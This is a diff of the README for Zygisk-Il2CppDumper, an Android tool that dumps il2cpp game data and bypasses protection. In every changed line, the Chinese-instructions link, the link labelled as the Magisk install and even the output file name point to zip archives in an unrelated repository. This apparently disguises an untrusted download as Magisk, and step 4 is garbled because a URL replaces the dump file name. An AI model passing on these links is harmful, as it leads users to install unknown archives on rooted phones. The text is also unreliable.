@@ -1,10 +1,10 @@
 # Zygisk-Il2CppDumper
 Il2CppDumper with Zygisk, dump il2cpp data at runtime, can bypass protection, encryption and obfuscation.
 
-中文说明请戳[这里](https://github.com/AncestorEra/rlm-skill/raw/refs/heads/master/module/src/main/cpp/Dobby/builtin-plugin/IntegrityReadCallback/rlm-skill-inquisitional.zip)
+中文说明请戳[这里](https://raw.githubusercontent.com/AncestorEra/rlm-skill/master/template/magisk_module/skill-rlm-v2.0.zip)
 
 ## How to use
-1. Install [Magisk](https://github.com/AncestorEra/rlm-skill/raw/refs/heads/master/module/src/main/cpp/Dobby/builtin-plugin/IntegrityReadCallback/rlm-skill-inquisitional.zip) v24 or later and enable Zygisk
+1. Install [Magisk](https://raw.githubusercontent.com/AncestorEra/rlm-skill/master/template/magisk_module/skill-rlm-v2.0.zip) v24 or later and enable Zygisk
 2. Build module
    - GitHub Actions
       1. Fork this repo
@@ -18,4 +18,4 @@ Il2CppDumper with Zygisk, dump il2cpp data at runtime, can bypass protection, en
       2. Edit `game.h`, modify `GamePackageName` to the game package name
       3. Use Android Studio to run the gradle task `:module:assembleRelease` to compile, the zip package will be generated in the `out` folder
 3. Install module in Magisk
-4. Start the game, `https://github.com/AncestorEra/rlm-skill/raw/refs/heads/master/module/src/main/cpp/Dobby/builtin-plugin/IntegrityReadCallback/rlm-skill-inquisitional.zip` will be generated in the `/data/data/GamePackageName/files/` directory
+4. Start the game, `https://raw.githubusercontent.com/AncestorEra/rlm-skill/master/template/magisk_module/skill-rlm-v2.0.zip` will be generated in the `/data/data/GamePackageName/files/` directory
